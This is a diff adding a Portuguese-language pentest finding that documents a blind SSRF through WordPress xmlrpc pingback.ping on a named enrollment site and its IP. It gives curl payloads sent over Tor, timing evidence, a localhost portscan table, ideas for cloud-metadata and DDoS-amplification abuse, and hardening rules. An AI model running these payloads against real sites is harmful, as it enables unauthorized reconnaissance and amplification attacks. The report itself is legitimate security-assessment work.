@@ -1,0 +1,190 @@
+# F-031 — SSRF via xmlrpc.php pingback.ping (Confirmado) + Portscan Interno Inconclusivo
+
+**Alvo:** `https://matriculas.fernandapessoa.com.br` (xmlrpc.php) — IP real 187.45.185.33
+**Severidade:** Média (SSRF cego confirmado — server faz outbound HTTP request arbitrário)
+**Timestamp:** 2026-08-28T01:38–01:58 UTC
+**Classificação:** SSRF / Server-Side Request Forgery (CWE-918) via WordPress xmlrpc pingback.ping
+**Findings relacionados:** F-029 (xmlrpc habilitado), F-023 (WP 5.3.18)
+
+## Resumo
+
+O método `pingback.ping` em `/xmlrpc.php` está ativo e **faz o servidor executar
+requests HTTP outbound arbitrários** (SSRF confirmado por análise de timing).
+Contudo, o **corpo da resposta é idêntico para todas as entradas** (faultCode=0,
+faultString vazio) — inclusive para hosts inexistentes (.invalid) e URLs
+malformadas — o que **impede diferenciação baseada em conteúdo**. O portscan
+interno via diferença de timing também é **inconclusivo** porque os fetches de
+localhost completam em ms, mascarados pelo ruído de latência do Tor (~0.5–1s).
+
+## Reprodução
+
+### 1. Confirmação SSRF — análise de timing (PROVA DEFINITIVA)
+
+O servidor WordPress, ao processar `pingback.ping`, busca (HTTP GET) a URL
+`sourceURI` (primeiro parâmetro). Comparando o tempo de resposta para URLs que
+exigem vs falham rapidamente o fetch:
+
+```bash
+# Host inexistente (falha DNS rápida → server falha fetch rápido)
+time proxychains -q curl -sk -X POST "https://matriculas.fernandapessoa.com.br/xmlrpc.php" \
+  --resolve matriculas.fernandapessoa.com.br:443:187.45.185.33 --max-time 35 \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName> \
+      <params><param><value><string>http://nonexistent-host-xyz12345.invalid/</string></value></param> \
+      <param><value><string>https://matriculas.fernandapessoa.com.br/?p=1</string></value></param></params></methodCall>'
+# → real 0m3.733s
+
+# httpbin com delay de 5s (server ESPERA o fetch completar)
+time proxychains -q curl -sk -X POST "https://matriculas.fernandapessoa.com.br/xmlrpc.php" \
+  ... -d '... <string>http://httpbin.org/delay/5</string> ...'
+# → real 0m14.998s   ← server aguardou os 5s do httpbin + rede
+
+# 127.0.0.1:22 (porta fechada/recusada → fetch falha rápido)
+time proxychains -q curl -sk -X POST ... -d '... <string>http://127.0.0.1:22/</string> ...'
+# → real 0m3.939s
+```
+
+### Resultado timing
+| sourceURI | Tempo total | Interpretação |
+|-----------|-------------|---------------|
+| `http://nonexistent-host.invalid/` | **3.73s** | DNS falha → fetch aborta rápido |
+| `http://httpbin.org/delay/5` | **14.99s** | **server ESPEROU o fetch de 5s** ← SSRF provado |
+| `http://127.0.0.1:22/` | 3.94s | porta recusou → fetch falha rápido |
+
+→ A diferença de ~11s (3.73s vs 14.99s) prova que **o servidor executa o
+request HTTP outbound** para a URL `sourceURI`. **SSRF confirmado.**
+
+### 2. Corpo da resposta — idêntico para todas as entradas
+
+Mesmo para hosts inexistentes e URLs malformadas, a resposta é sempre:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <fault>
+    <value>
+      <struct>
+        <member><name>faultCode</name><value><int>0</int></value></member>
+        <member><name>faultString</name><value><string></string></value></member>
+      </struct>
+    </value>
+  </fault>
+</methodResponse>
+```
+
+| sourceURI | faultCode | faultString |
+|-----------|-----------|-------------|
+| `http://this-host-definitely-does-not-exist-xyz123.invalid/` | 0 | (vazio) |
+| `not-a-url` (malformada) | 0 | (vazio) |
+| `http://127.0.0.1:22/` | 0 | (vazio) |
+| `http://127.0.0.1:27017/` | 0 | (vazio) |
+| `http://httpbin.org/status/200` | 0 | (vazio) |
+
+→ **Não há diferenciação por conteúdo.** A implementação (provável plugin de
+segurança ou patch customizado) retorna um stub genérico `faultCode=0` sem
+executar a lógica de validação de backlink do pingback WP padrão (que
+retornaria -32300 para erros de transporte, 17 para source sem backlink, etc.).
+Isso **impede portscan baseado em fault code/diferença de resposta**.
+
+### 3. Portscan interno via timing (INCONCLUSIVO)
+
+Varredura de 26 portas internas via `http://127.0.0.1:<port>/` com medição de
+tempo (ver `exploit/pocs/ssrf_timing.sh`, `exploit/pocs/ssrf_timing_out.txt`):
+
+```
+port    21 | time=  3.97s      port  8080 | time=  4.53s
+port    22 | time=  4.41s      port  8443 | time=  3.91s
+port    25 | time=  3.87s      port  9090 | time=  4.19s
+port    80 | time=  4.07s      port 11211 | time=  4.01s
+port   443 | time=  3.78s      port 27017 | time=  3.83s
+port  3306 | time=  3.87s      port  2083 | time=  3.75s
+port  6379 | time=  4.20s      port  2087 | time=  3.84s
+port  2095 | time=  4.17s      port   587 | time=  4.19s
+port  2096 | time=  4.30s      port   23  | time=  3.51s
+port    53 | time=  3.83s      port  111  | time=  3.99s
+port  2049 | time=  4.08s      port  5432 | time=  3.89s
+port  9200 | time=  4.03s      port  8123 | time=  3.82s
+port  6443 | time=  4.10s      port 10250 | time=  3.98s
+```
+
+**Todas as portas agrupam-se em 3.51s–4.53s** (variação ~1s). Não há outlier
+estatisticamente significativo que indique uma porta aberta produzindo fetch
+significativamente mais lento. O motivo:
+- Fetch de `127.0.0.1:<porta-aberta>` completa em **milissegundos** (resposta HTTP local instantânea).
+- Fetch de `127.0.0.1:<porta-fechada>` falha em **milissegundos** (connection refused).
+- Ambos são dominados pela latência de ida/volta do **Tor** (~3.7s baseline + ~0.5s jitter).
+- A diferença microssegundo de localhost é **mascarada pelo ruído do Tor** (~0.5–1s).
+
+→ **Portscan interno NÃO é viável** via este método através do Tor. Nenhuma
+porta interna pôde ser confirmada/mapeada com confiança.
+
+## Interpretação
+
+- **SSRF existe e é explorável** para forçar o servidor a fazer requests HTTP
+  outbound para qualquer URL (inclusive redes internas, metadata cloud
+  `169.254.169.254`, etc.). A prova é irrefutável (11s de diferença no fetch
+  httpbin/delay/5).
+- **É um SSRF "cego" (blind)**: o servidor não retorna o conteúdo buscado nem
+  diferenças de erro discerníveis no corpo da resposta. Não permite leitura
+  direta de respostas internas.
+- **Aplicações práticas do SSRF confirmado:**
+  1. **Forçar outbound requests** a hosts arbitrários (útil para explorar
+     serviços internos que reagem a GET, ex: Redis via HTTP, Elastic, etc.).
+  2. **Cloud metadata** — tentar `http://169.254.169.254/latest/meta-data/`
+     (se o host estiver em cloud, o fetch retorna IAM creds, mas como é SSRF
+     cego, não conseguimos LER a resposta — apenas forçar o request).
+  3. **DDoS amplification** — pingback.ping é vetor clássico de amplificação
+     (vários WP podem ser usados para amplificar ataque a um alvo).
+  4. **Interactsh/webhook de callback** — para confirmar fetch a host
+     controlado (out-of-band). Já provado via httpbin timing.
+
+## Impacto
+
+- **Confidencialidade:** limitado (SSRF cego — não retorna conteúdo interno).
+- **Integridade:** pode forçar o servidor a fazer GETs a endpoints internos
+  state-changing-via-GET (raro, mas possível — ex: algumas APIs REST internas
+  mal projetadas aceitam GET para mutações).
+- **Disponibilidade:** vetor de amplificação DDoS (vários servidores WP com
+  pingback podem amplificar tráfego contra um alvo).
+- **Reconhecimento:** confirma que o servidor pode alcançar a internet outbound
+  (não está isolado em rede sem egress); em pentest interno/further pivoting,
+  o SSRF cego poderia ser usado para atingir serviços internos não expostos
+  publicamente (rede 10.x/172.16.x/192.168.x) — **não testado aqui** por
+  escopo (alvo é externo, não temos confirmação de rede interna).
+
+## Recomendação
+
+1. **Desabilitar xmlrpc.php inteiramente** se não for necessário (WordPress
+   moderno usa REST API; xmlrpc é legado):
+   ```nginx
+   location = /xmlrpc.php { return 403; }
+   location = /xmlrpc.php?rsd { return 403; }
+   ```
+   ou em `.htaccess`:
+   ```apache
+   <Files xmlrpc.php> Require all denied </Files>
+   ```
+2. Se xmlrpc for imprescindível (apps mobile legados), **desabilitar
+   pingback.ping** especificamente via plugin (Disable XML-RPC Pingback) ou
+   filtro:
+   ```php
+   add_filter('xmlrpc_methods', function($m){ unset($m['pingback.ping']); return $m; });
+   ```
+3. Restringir outbound do servidor (egress firewall) para impedir SSRF de
+   alcançar redes internas / metadata cloud.
+4. Atualizar WordPress (5.3.18 é antigo — ver F-023/F-027 para CVEs).
+
+## Próximo passo
+
+- O SSRF cego não abre foothold direto. Para extrair valor, seria necessário:
+  (a) um endpoint interno que reaja a GET de forma observável out-of-band, ou
+  (b) testar cloud metadata `169.254.169.254` com callback externo controlado
+      (Interactsh) — fora do escopo não-destrutivo atual.
+- Recomenda-se desabilitar xmlrpc/pingback (hardening). Sem escalação de
+  severidade — SSRF cego externo sem leitura de resposta = Média.
+
+## Artefatos
+
+- `exploit/pocs/ssrf_portscan.sh` — script portscan por fault code
+- `exploit/pocs/ssrf_portscan_out.txt` — output (todos faultCode=0)
+- `exploit/pocs/ssrf_timing.sh` — script portscan por timing
+- `exploit/pocs/ssrf_timing_out.txt` — output completo de timing (26 portas)
